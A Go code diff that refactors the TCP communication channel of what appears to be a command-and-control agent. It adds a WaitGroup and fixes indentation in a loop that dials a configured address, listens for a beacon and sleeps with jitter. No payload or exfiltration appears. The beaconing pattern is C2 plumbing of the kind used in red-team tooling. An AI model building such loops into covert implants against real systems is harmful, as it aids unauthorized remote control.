@@ -11,6 +11,7 @@ import (
 	"net"
 	"os"
 	"strings"
+	"sync"
 )
 
 type TCP struct {}
@@ -19,15 +20,16 @@ func init() {
 	CommunicationChannels["tcp"] = TCP{}
 }
 
-func (contact TCP) Communicate(agent *util.AgentConfig, beacon Beacon) {
+func (contact TCP) Communicate(wg *sync.WaitGroup, agent *util.AgentConfig, beacon Beacon) {
+	defer wg.Done()
 	for {
 		conn, err := net.Dial("tcp", agent.Address)
-	   	if err != nil {
-	   		log.Printf("[-] %s is either unavailable or a firewall is blocking traffic.", agent.Address)
-	   	} else {
-	   		listen(conn, beacon, agent)
-	   	}
-	   	jitterSleep(agent.Sleep, "TCP")
+		if err != nil {
+			log.Printf("[-] %s is either unavailable or a firewall is blocking traffic.", agent.Address)
+		} else {
+			listen(conn, beacon, agent)
+		}
+		jitterSleep(agent.Sleep, "TCP")
 	}
 }
 
